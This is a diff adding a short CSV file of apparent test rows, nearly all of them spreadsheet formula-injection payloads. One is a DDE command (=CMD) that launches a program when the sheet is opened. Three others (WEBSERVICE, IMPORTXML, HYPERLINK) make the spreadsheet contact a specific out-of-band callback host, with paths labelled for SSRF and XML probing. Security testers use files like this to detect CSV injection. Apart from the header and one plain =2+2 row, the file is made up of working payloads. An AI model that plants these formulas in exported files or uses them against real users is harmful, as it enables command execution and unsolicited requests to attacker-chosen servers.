@@ -1,0 +1,6 @@
+Name,Formula,Result
+Test1,=2+2,=2+2
+Test2,=CMD|'/C calc'!A0,
+Test3,=WEBSERVICE("http://d9639s25j6jvk74dn89gbdyw6p3kkmcet.oast.online/csv-ssrf"),
+Test4,=IMPORTXML("http://d9639s25j6jvk74dn89gbdyw6p3kkmcet.oast.online/csv-xml","//"),
+Test5,=HYPERLINK("http://d9639s25j6jvk74dn89gbdyw6p3kkmcet.oast.online/csv-link","click")
